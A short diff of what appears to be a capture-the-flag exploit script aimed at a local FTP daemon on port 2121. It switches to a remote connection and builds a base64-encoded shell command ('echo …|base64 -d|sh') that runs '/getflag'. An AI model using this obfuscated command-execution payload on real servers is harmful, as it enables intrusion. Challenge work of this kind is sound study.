@@ -5,7 +5,7 @@ TARGET = './ftpd'
 HOST = 'localhost'
 PORT =  2121
 
-r = start()
+r = remote(HOST, PORT)
 raw_cmd = b'ls -la /;/getflag'
 cmd = f'echo {b64e(raw_cmd)}|base64 -d|sh'
 
